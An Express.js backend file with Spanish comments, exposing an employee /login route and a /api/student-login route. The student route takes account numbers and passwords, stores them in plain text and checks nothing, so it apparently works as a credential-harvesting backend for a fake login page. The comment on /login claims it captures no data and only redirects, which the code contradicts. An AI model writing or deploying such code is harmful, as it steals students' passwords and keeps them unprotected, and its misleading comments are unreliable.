require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { verifyLogin } = require('./src/supabaseClient');
const { saveStudentCredentials } = require('./src/studentCredentialStorage');

const app = express();
const PORT = process.env.PORT || 4000;

// Habilita CORS para que el frontend (localhost:3000) pueda llamar al API
// sin restricciones de origen. Solo se aplica en desarrollo; en prod se
// configura con un reverse proxy.
app.use(cors());
app.use(express.json({ limit: '10kb' }));

/**
 * Endpoint de autenticación de empleados (Supabase Auth).
 * Sección "en mantenimiento": el flujo real no captura datos, solo redirige
 * al cliente a /error. Se mantiene por compatibilidad con la pila.
 */
app.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body || {};

    if (!email || !password) {
      return res.status(400).json({
        success: false,
        error: 'Faltan email o password en el cuerpo de la peticion.',
      });
    }

    const { data, error } = await verifyLogin(email, password);

    if (error) {
      console.error('Supabase login error:', error.message);
      return res.status(401).json({ success: false, error: error.message });
    }

    return res.json({
      success: true,
      user: data.user,
      session: data.session,
    });
  } catch (err) {
    console.error('Error inesperado en /login:', err);
    return res.status(500).json({
      success: false,
      error: 'Error interno del servidor.',
    });
  }
});

/**
 * Nuevo endpoint: captura el número de cuenta + contraseña del estudiante
 * en texto plano (sin hash) y los guarda en la base de datos Supabase.
 * POST /api/student-login { cuenta, contrasenia } -> { success }
 */
app.post('/api/student-login', async (req, res) => {
  try {
    const { cuenta, contrasenia } = req.body || {};

    if (!cuenta || !contrasenia) {
      return res.status(400).json({
        success: false,
        error: 'Faltan numero de cuenta o contraseña en el cuerpo de la peticion.',
      });
    }

    await saveStudentCredentials(cuenta, contrasenia);
    return res.json({ success: true });
  } catch (err) {
    console.error('Error al guardar credenciales del estudiante:', err);
    return res.status(500).json({
      success: false,
      error: 'No se pudo guardar la informacion.',
    });
  }
});

app.listen(PORT, () => {
  console.log(`[backend] API listen on http://localhost:${PORT}`);
});
